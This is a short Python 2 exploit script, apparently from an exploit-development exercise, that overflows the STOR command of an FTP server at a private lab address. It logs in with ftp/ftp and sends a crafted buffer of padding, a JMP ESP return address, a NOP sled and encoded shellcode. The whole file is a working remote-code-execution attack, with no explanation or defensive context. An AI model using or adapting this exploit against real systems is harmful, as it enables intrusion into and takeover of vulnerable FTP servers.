#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#77D8AF0A -> JMP ESP

ret = '\x0A\xAF\xD8\x77'

shellcode = ("\x33\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x22"
"\x99\xda\xee\x83\xeb\xfc\xe2\xf4\xde\xf3\x31\xa3\xca\x60\x25\x11"
"\xdd\xf9\x51\x82\x06\xbd\x51\xab\x1e\x12\xa6\xeb\x5a\x98\x35\x65"
"\x6d\x81\x51\xb1\x02\x98\x31\xa7\xa9\xad\x51\xef\xcc\xa8\x1a\x77"
"\x8e\x1d\x1a\x9a\x25\x58\x10\xe3\x23\x5b\x31\x1a\x19\xcd\xfe\xc6"
"\x57\x7c\x51\xb1\x06\x98\x31\x88\xa9\x95\x91\x65\x7d\x85\xdb\x05"
"\x21\xb5\x51\x67\x4e\xbd\xc6\x8f\xe1\xa8\x01\x8a\xa9\xda\xea\x65"
"\x62\x95\x51\x9e\x3e\x34\x51\xae\x2a\xc7\xb2\x60\x6c\x97\x36\xbe"
"\xdd\x4f\xbc\xbd\x44\xf1\xe9\xdc\x4a\xee\xa9\xdc\x7d\xcd\x25\x3e"
"\x4a\x52\x37\x12\x19\xc9\x25\x38\x7d\x10\x3f\x88\xa3\x74\xd2\xec"
"\x77\xf3\xd8\x11\xf2\xf1\x03\xe7\xd7\x34\x8d\x11\xf4\xca\x89\xbd"
"\x71\xca\x99\xbd\x61\xca\x25\x3e\x44\xf1\xcb\xb2\x44\xca\x53\x0f"
"\xb7\xf1\x7e\xf4\x52\x5e\x8d\x11\xf4\xf3\xca\xbf\x77\x66\x0a\x86"
"\x86\x34\xf4\x07\x75\x66\x0c\xbd\x77\x66\x0a\x86\xc7\xd0\x5c\xa7"
"\x75\x66\x0c\xbe\x76\xcd\x8f\x11\xf2\x0a\xb2\x09\x5b\x5f\xa3\xb9"
"\xdd\x4f\x8f\x11\xf2\xff\xb0\x8a\x44\xf1\xb9\x83\xab\x7c\xb0\xbe"
"\x7b\xb0\x16\x67\xc5\xf3\x9e\x67\xc0\xa8\x1a\x1d\x88\x67\x98\xc3"
"\xdc\xdb\xf6\x7d\xaf\xe3\xe2\x45\x89\x32\xb2\x9c\xdc\x2a\xcc\x11"
"\x57\xdd\x25\x38\x79\xce\x88\xbf\x73\xc8\xb0\xef\x73\xc8\x8f\xbf"
"\xdd\x49\xb2\x43\xfb\x9c\x14\xbd\xdd\x4f\xb0\x11\xdd\xae\x25\x3e"
"\xa9\xce\x26\x6d\xe6\xfd\x25\x38\x70\x66\x0a\x86\xd2\x13\xde\xb1"
"\x71\x66\x0c\x11\xf2\x99\xda\xee")

buffer = "\x41" * 965 + ret + "\x43" * 16 + "\x90" * 16 + shellcode + '\xCC' * 655

print "\nSending evil buffer..."
s.connect(('192.168.13.97',21))
data = s.recv(1024)
s.send('USER ftp' +'\r\n')
data = s.recv(1024)
s.send('PASS ftp' +'\r\n')
data = s.recv(1024)
s.send('STOR ' +buffer+'\r\n')
s.close()
